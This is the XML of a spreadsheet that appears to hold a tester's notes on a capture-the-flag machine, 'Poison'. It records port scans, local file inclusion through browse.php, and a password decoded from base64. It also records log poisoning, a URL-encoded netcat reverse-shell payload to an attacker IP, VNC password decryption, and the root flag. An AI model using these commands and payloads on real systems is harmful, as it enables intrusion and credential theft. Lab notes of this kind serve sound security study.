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2A29CADE-83FE-47AB-A6BB-4E27CBFE1E71}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" activeTab="2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" i="1" l="1"/>
  <c r="E2" i="1"/>
  <c r="F3" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="75" uniqueCount="56">
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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80/tcp</t>
  </si>
  <si>
    <t>22/tcp</t>
  </si>
  <si>
    <t>22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)</t>
  </si>
  <si>
    <t xml:space="preserve">/index.php </t>
  </si>
  <si>
    <t>/index.php/login/</t>
  </si>
  <si>
    <t>/info.php</t>
  </si>
  <si>
    <t xml:space="preserve">/phpinfo.php  </t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">/usr/local/www/apache24/data/
Array
(
    [0] =&gt; .
    [1] =&gt; ..
    [2] =&gt; browse.php
    [3] =&gt; index.php
    [4] =&gt; info.php
    [5] =&gt; ini.php
    [6] =&gt; listfiles.php
    [7] =&gt; phpinfo.php
    [8] =&gt; pwdbackup.txt
)
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &amp;:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &amp;:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>charix:*:1001:1001:charix:/home/charix:/bin/csh</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">PHP Version 5.6.32
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
Kept decoding: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Charix!2#4%6&amp;8(0</t>
    </r>
  </si>
  <si>
    <t>Lol this is the whole password: Charix!2#4%6&amp;8(0</t>
  </si>
  <si>
    <t>charix:Charix!2#4%6&amp;8(0</t>
  </si>
  <si>
    <t>Poison</t>
  </si>
  <si>
    <t>charix</t>
  </si>
  <si>
    <t>secret.zip</t>
  </si>
  <si>
    <t xml:space="preserve">Charix!2#4%6&amp;8(0 is secret.zip password.
Non-ISO extended-ASCII text, with no line terminators
00000000: bda8 5b7c d596 7a21 </t>
  </si>
  <si>
    <t>ps aux</t>
  </si>
  <si>
    <t>netstat -an | grep LISTEN</t>
  </si>
  <si>
    <t>nmap -p 5901 --script vnc-info 127.0.0.1</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">5901/tcp open  vnc-1
| vnc-info: 
|   Protocol version: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>3.8</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)</t>
    </r>
  </si>
  <si>
    <t>echo -n bda85b7cd5967a21 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv</t>
  </si>
  <si>
    <t>https://github.com/billchaison/VNCDecrypt</t>
  </si>
  <si>
    <t>VNC viewer?
VNC pass encrypted.
It's running as root.</t>
  </si>
  <si>
    <t>80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Tried log poisoning.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">"VNCP@$$!"
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>root.txt: 716d04b188419cf2bb99d891272361f5</t>
    </r>
  </si>
  <si>
    <t>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Ccsh%20-i%202%3E%261%7Cnc%20[attack IP]%204444%20%3E%2Ftmp%2Ff</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>http://[victim IP]/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</si>
  <si>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</si>
  <si>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</si>
  <si>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ffuf -w /usr/share/wordlists/dirb/common.txt -u http://[victim IP]/browse.php?file=/home/charix/FUZZ -e .zip,.bak,.txt,.rar -fl 5</t>
  </si>
  <si>
    <t>scp charix@[victim IP]:/home/charix/secret.zip secret.zip</t>
  </si>
  <si>
    <t>http://[victim IP]/browse.php?file=/var/log/httpd-access.log&amp;c=id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</si>
</sst>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2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billchaison/VNCDecryp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8"/>
  <sheetViews>
    <sheetView zoomScale="84" zoomScaleNormal="84" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G28" sqref="G28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="20.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="17.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="22.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="15.109375" style="2" customWidth="1"/>
    <col min="5" max="5" width="10.33203125" style="2" customWidth="1"/>
    <col min="6" max="6" width="14.21875" style="2" customWidth="1"/>
    <col min="7" max="7" width="55" style="2" customWidth="1"/>
    <col min="8" max="8" width="62.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="48.88671875" style="2" customWidth="1"/>
    <col min="10" max="10" width="28" style="2" customWidth="1"/>
    <col min="11" max="11" width="52.21875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.886718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1" t="s">
        <v>49</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>34</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>23</v>
      </c>
      <c r="E2" s="6" t="str">
        <f>LEFT($D2,FIND("/",$D2)-1)</f>
        <v>80</v>
      </c>
      <c r="F2" s="7" t="str">
        <f>MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>46</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>31</v>
      </c>
      <c r="I2" s="2" t="s">
        <v>30</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>34</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>24</v>
      </c>
      <c r="E3" s="6" t="str">
        <f>LEFT($D3,FIND("/",$D3)-1)</f>
        <v>22</v>
      </c>
      <c r="F3" s="7" t="str">
        <f>MID($D3,FIND("/",$D3)+1,LEN($D3))</f>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>25</v>
      </c>
      <c r="H3" s="4" t="s">
        <v>32</v>
      </c>
      <c r="I3" s="4" t="s">
        <v>33</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E4" s="6"/>
      <c r="F4" s="7"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="E5" s="6"/>
      <c r="F5" s="7"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1"/>
      <c r="E6" s="6"/>
      <c r="F6" s="7"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E7" s="9"/>
      <c r="F7" s="7"/>
      <c r="H7" s="4"/>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E8" s="6"/>
      <c r="F8" s="7"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1"/>
      <c r="E9" s="6"/>
      <c r="F9" s="7"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="1"/>
      <c r="E10" s="6"/>
      <c r="F10" s="7"/>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="6"/>
      <c r="F11" s="7"/>
      <c r="I11" s="4"/>
      <c r="J11" s="5"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="6"/>
      <c r="F12" s="7"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1"/>
      <c r="E13" s="6"/>
      <c r="F13" s="7"/>
      <c r="G13" s="4"/>
      <c r="I13" s="4"/>
      <c r="J13" s="5"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="1"/>
      <c r="E14" s="6"/>
      <c r="F14" s="7"/>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="1"/>
      <c r="E15" s="6"/>
      <c r="F15" s="7"/>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E16" s="6"/>
      <c r="F16" s="7"/>
    </row>
    <row r="17" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E17" s="6"/>
      <c r="F17" s="7"/>
    </row>
    <row r="18" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E18" s="6"/>
      <c r="F18" s="7"/>
    </row>
    <row r="19" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1"/>
      <c r="E19" s="6"/>
      <c r="F19" s="7"/>
    </row>
    <row r="20" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="1"/>
      <c r="E20" s="6"/>
      <c r="F20" s="7"/>
    </row>
    <row r="21" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1"/>
      <c r="E21" s="6"/>
      <c r="F21" s="7"/>
    </row>
    <row r="22" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E22" s="6"/>
      <c r="F22" s="7"/>
    </row>
    <row r="23" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1"/>
      <c r="E23" s="6"/>
      <c r="F23" s="7"/>
      <c r="I23" s="4"/>
      <c r="J23" s="5"/>
    </row>
    <row r="24" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="6"/>
      <c r="F24" s="7"/>
    </row>
    <row r="25" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E25" s="6"/>
      <c r="F25" s="7"/>
    </row>
    <row r="26" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E26" s="6"/>
      <c r="F26" s="7"/>
      <c r="I26" s="4"/>
      <c r="J26" s="5"/>
    </row>
    <row r="27" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="1"/>
      <c r="E27" s="6"/>
      <c r="F27" s="7"/>
    </row>
    <row r="28" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E28" s="6"/>
      <c r="F28" s="7"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K29">
    <sortCondition ref="F2:F29"/>
    <sortCondition ref="E2:E29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H24"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="D6" sqref="D6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="29.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="39.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="18.5546875" style="2" customWidth="1"/>
    <col min="4" max="4" width="34.33203125" style="2" customWidth="1"/>
    <col min="5" max="6" width="64" style="2" customWidth="1"/>
    <col min="7" max="7" width="22.88671875" style="2" customWidth="1"/>
    <col min="8" max="8" width="49.44140625" style="2" customWidth="1"/>
    <col min="9" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>50</v>
      </c>
      <c r="B2" s="2"/>
      <c r="C2" s="2">
        <v>200</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>26</v>
      </c>
      <c r="E2" s="2"/>
      <c r="F2" s="2"/>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>50</v>
      </c>
      <c r="C3" s="2">
        <v>200</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>27</v>
      </c>
      <c r="G3" s="5"/>
    </row>
    <row r="4" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>50</v>
      </c>
      <c r="C4" s="2">
        <v>200</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>50</v>
      </c>
      <c r="C5" s="2">
        <v>200</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E5" s="1"/>
    </row>
    <row r="6" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E6" s="1"/>
      <c r="F6" s="4"/>
    </row>
    <row r="8" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D8" s="4"/>
    </row>
    <row r="9" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D9" s="4"/>
    </row>
    <row r="10" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D10" s="4"/>
      <c r="F10" s="5"/>
    </row>
    <row r="11" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D11" s="4"/>
    </row>
    <row r="12" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D12" s="4"/>
    </row>
    <row r="13" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D13" s="4"/>
    </row>
    <row r="14" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D14" s="4"/>
    </row>
    <row r="15" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D15" s="4"/>
    </row>
    <row r="24" spans="7:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G24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tabSelected="1" zoomScale="73" zoomScaleNormal="73" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="G15" sqref="G15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="20.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="16384" width="20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49</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>35</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>37</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>36</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>49</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>42</v>
      </c>
      <c r="C3" s="2">
        <v>5901</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>35</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>45</v>
      </c>
      <c r="I3" s="5" t="s">
        <v>44</v>
      </c>
      <c r="J3" s="2" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="I3" r:id="rId1" xr:uid="{818AED88-B92F-4E8F-A1E2-A1C1D82FBC67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13"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <selection activeCell="A26" sqref="A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="122.21875" style="8" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="3" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="4" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="8" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="8" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="8" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="7" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="8" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="8" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="8" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="9" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="8" t="s">
        <v>39</v>
      </c>
    </row>
    <row r="10" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="8" t="s">
        <v>40</v>
      </c>
    </row>
    <row r="11" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="8" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="12" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="13" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="8" t="s">
        <v>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"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A30" sqref="A30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Web App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2026-06-30T13:00:21Z</dcterms:modified>
</cp:coreProperties>
</file>